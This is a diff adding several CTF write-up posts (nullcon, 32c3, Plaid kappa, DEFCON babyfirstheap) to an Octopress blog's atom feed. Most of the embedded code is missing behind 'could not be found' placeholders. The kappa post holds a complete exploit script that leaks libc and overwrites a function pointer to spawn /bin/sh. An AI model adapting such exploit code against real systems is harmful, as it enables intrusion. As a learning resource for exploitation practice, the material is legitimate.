@@ -4,7 +4,7 @@
   <title><![CDATA[pwn_expoit Blog]]></title>
   <link href="http://naver.com/atom.xml" rel="self"/>
   <link href="http://naver.com/"/>
-  <updated>2016-02-06T06:54:04-08:00</updated>
+  <updated>2016-02-06T06:57:13-08:00</updated>
   <id>http://naver.com/</id>
   <author>
     <name><![CDATA[pwn_expoit]]></name>
@@ -12,5 +12,256 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[2016 nullcon pwn 200]]></title>
+    <link href="http://naver.com/blog/2016/01/31/2016-nullcon-pwn-200/"/>
+    <updated>2016-01-31T17:35:45-08:00</updated>
+    <id>http://naver.com/blog/2016/01/31/2016-nullcon-pwn-200</id>
+    <content type="html"><![CDATA[<p>recently, I challenge nullcon 2016. when hold ctf, i catched pwnable.However, pwn 100 is arm exploit that i can&rsquo;t solve. So i decide to challengepwn 200.<br>
+at frist, pwn 200 seem very easy:) . analyzing it, i think that this is sandbox. it was first time for me. <br></p>
+
+<h2>Analysis<br></h2>
+
+<p>this binary conserve with process using pipe. parent process could not exploit because it is sandbox that only use syscall(exit, read, write).
+<br>
+File /home/pwn/Desktop/octopress/source/codeview/parent.c could not be found
+<br>
+parent process call custom function at final. in order to exploit, use to non sandbox(child process) So, i create assembly code to pipe write.
+<br>
+and then, i analyze child function. there are some inputs in child function.<br></p>
+
+<h3>inputs in child function</h3>
+
+<p>1st input: most input 0x0e<br>
+2nd input: buffer size limited 0x1000<br>
+3rd input: buffer had to start &ldquo;<a href="http://">http://</a>&rdquo; <----- heap buffer
+<br>
+<br></p>
+
+<h2>Vulnerable</h2>
+
+<p>after input, heap buffer(3rd input) is copied dest buffer(rbp-0x220).yet, heap buffer is possible 0x1000. it overwrite rip !!!! :)<br>
+File /home/pwn/Desktop/octopress/source/codeview/child.c could not be found
+<br>
+However, finding shellcode address is very hard. on this account, i faild to solve pwn 200 during nullcon ctf<br></p>
+
+<p>after finish ctf, i noticed that fork process share same address.<br>
+<a href="http://stackoverflow.com/questions/5365580/fork-same-memory-addresses">http://stackoverflow.com/questions/5365580/fork-same-memory-addresses</a><br>
+i saved stack. then stack overwrite rip :P.
+<br>
+File /home/pwn/Desktop/octopress/source/codeview/pipe.asm could not be found
+<br></p>
+
+<h2>exploit</h2>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/exploit could not be found</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[32c3 pwn[200] readme write up]]></title>
+    <link href="http://naver.com/blog/2015/12/31/32c3-pwn-200-readme-write-up/"/>
+    <updated>2015-12-31T07:16:00-08:00</updated>
+    <id>http://naver.com/blog/2015/12/31/32c3-pwn-200-readme-write-up</id>
+    <content type="html"><![CDATA[<p>after 32c3 ctf, i am sorry that sovled readme. so i challenge it again
+this binary is likely to analysis,but i am too stupid to can&rsquo;t solved</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmemain.c could not be found</p>
+
+<p>At first, unfortunately i had thought puts null byte leak(like codegate 2014 nuclear)but IO_gets generate \x00 in string lately
+After many tries, i find out that infomation leak from &ldquo;<strong><em> stack smashing detected </em></strong>&rdquo;</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmeleak could not be found</p>
+
+<p>above printing show argv[0] possible to overwirte. argv[0] pointer is located on $rsp+0x218</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmeargv could not be found</p>
+
+<p>so i execute Poc</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmepoc.py could not be found</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmepoc2 could not be found</p>
+
+<p>however, flag string is going to overwrite on second input, so i searched another flag string. fortunately,another string was exist.</p>
+
+<p>gdb-peda$ x/s 0x400d20
+0x400d20:   &ldquo;32C3_TheServerHasTheFlagHere&hellip;&rdquo;</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmepoc3 could not be found</p>
+
+<p>unfortunately!!!! i Can&rsquo;t show flag in remote server&hellip;.
+finally i open other write up, i notice &lsquo;LIBC_FATAL_STDERR_=1&rsquo;
+above the environment variable it make that show error messege on remote server</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmememory could not be found</p>
+
+<p>this is final payload
+File /home/pwn/Desktop/octopress/source/codeview/readmepayload.py could not be found</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Plaid ctf kappa[275] in 2014]]></title>
+    <link href="http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/"/>
+    <updated>2015-12-26T01:13:36-08:00</updated>
+    <id>http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014</id>
+    <content type="html"><![CDATA[<p>i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s start breaking kappa</p>
+
+<p>Kappa is Pokemon Game binary
+File /home/pwn/Desktop/octopress/source/codeview/kappaMenu.c could not be found
+there are 1-5 select that can choose. opening binary with IDA pro, i could see select function and Battle function.
+File /home/pwn/Desktop/octopress/source/codeview/KappaChoose1.c could not be found</p>
+
+<p>first select function is Battle system with wild Pokemon
+it is algorithm that encounter pokemon with &lsquo;an&rsquo; sequence(0: fail, 1: Kakuna, 2: charizar)
+[a1 = 0, a2 = 1, a3 = 0, a4 = 1, a5 = 0 &hellip;&hellip; a13 = 2]</p>
+
+<p>wild Pokemon is producted with other function. this function product struct using malloc.
+this method can become vulnerability on UAF. for now, i perceived it vulnerabilty</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappawild.c could not be found
+i find out vulnerability in Battle function that wild producted function include. it is type confusion.</p>
+
+<p>this vulnerability is happened when i throw pokeball to wild pokemon with filling all of pokeball room</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappavuln.c could not be found</p>
+
+<p>it ignore their type, blindly cover type field. then attacker can overflow in select 5</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappaart.c could not be found</p>
+
+<p>change artwork function change each other pokemon artwork(heap+15). if i cover type using vunlerblilty.</p>
+
+<p>kakuna struct:
+|name|      art      |0x878|hp|attack|technic|func_ptr</p>
+
+<p>charizar struct:
+|name|       art      |0x204|hp|attack|technic|func_ptr</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappaexploit.c could not be found
+Do you find out?</p>
+
+<p>i change charizar to kakuna, set free func_ptr using above function</p>
+
+<p>this is final payload</p>
+
+<pre><code class="python">
+from pwn_expoit import *
+def libc():
+    s = Netcon('192.168.224.152',4444)
+    recvuntil(s,"artwork")
+    for i in range(1,5):
+        s.send("1\n")
+        recvuntil(s,"artwork")
+        s.send("1\n")
+        recvuntil(s,"3. Run")
+        s.send("2\n")
+        recvuntil(s,"Pokemon?")
+        s.send("name\n")
+        recvuntil(s,"artwork")
+    for i in range(1,3):
+        s.send("1\n")
+        recvuntil(s,"artwork")
+        s.send("1\n")
+        recvuntil(s,"3. Run")
+        s.send("2\n")
+        recvuntil(s,"Pokemon?")
+        s.send("shot\n")
+        recvuntil(s,"5. name")
+        s.send("2\n")
+        recvuntil(s,"artwork")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("2\n")
+    recvuntil(s,"Pokemon?")
+    name = "/bin/sh\x00"
+    s.send(name+"\n")
+    recvuntil(s,"5. name")
+    s.send("3\n")
+    recvuntil(s,"artwork")
+    s.send("5\n")
+    recvuntil(s,"5. name")
+    s.send("3\n")
+    dat  = ""
+    dat += "A"*509
+    dat += p32(0x8048512)
+    dat += p32(0x8048766)
+    dat += "C"*1610
+    s.send(dat+"\n")
+    recvuntil(s,"artwork")
+    s.send("3\n")
+    r = u32(recvuntil(s,"artwork")[0xf85:0xf89])
+    argv = []
+    argv.append(s)
+    argv.append(r)
+    return argv
+def pwn(s,r):
+    s.send("5\n")
+    recvuntil(s,"5. name")
+    s.send("3\n")
+    libc_base = r-0xdabd0
+    system = libc_base + 0x40190
+    print "libc_base : "+hex(libc_base)
+    print "system : "+hex(system)
+    dat  = ""
+    dat += "A"*513
+    dat += p32(system)
+    dat += "C"*1610
+    s.send(dat+"\n")
+    recvuntil(s,"artwork")
+    s.send("3\n")
+    recvuntil(s,"Attack: Tackle")
+    interact(s)
+argv = libc()
+pwn(argv[0],argv[1])
+</code></pre>
+
+
+<p></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[exploit-exercise fusion level4]]></title>
+    <link href="http://naver.com/blog/2015/11/15/exploit-exercise-fusion-level4/"/>
+    <updated>2015-11-15T05:51:33-08:00</updated>
+    <id>http://naver.com/blog/2015/11/15/exploit-exercise-fusion-level4</id>
+    <content type="html"><![CDATA[<p>File /home/pwn/Desktop/octopress/source/codeview/fusion.py could not be found</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[2015 DEFCON babyfirstheap]]></title>
+    <link href="http://naver.com/blog/2015/11/15/2015-defcon-babyfirstheap/"/>
+    <updated>2015-11-15T04:21:48-08:00</updated>
+    <id>http://naver.com/blog/2015/11/15/2015-defcon-babyfirstheap</id>
+    <content type="html"><![CDATA[<p>This binary how to using doubler free bug rather than finding vuln '</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0x13</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[FREE][address=%X]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">));</span>
+    <span class="n">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">));</span>
+  <span class="p">}</span></code></pre></div>
+
+
+<p>when open binary to hex-rays, i could see that successive free. it is very vulnerable So i debuged binary, then i faced segment fault</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/debug could not be found</p>
+
+<p>i hereby control got overwrite.(specific technic about this vuln that reference<a href="https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf">https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf</a></p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/babyfirstheap.py could not be found</p>
+]]></content>
+  </entry>
   
 </feed>
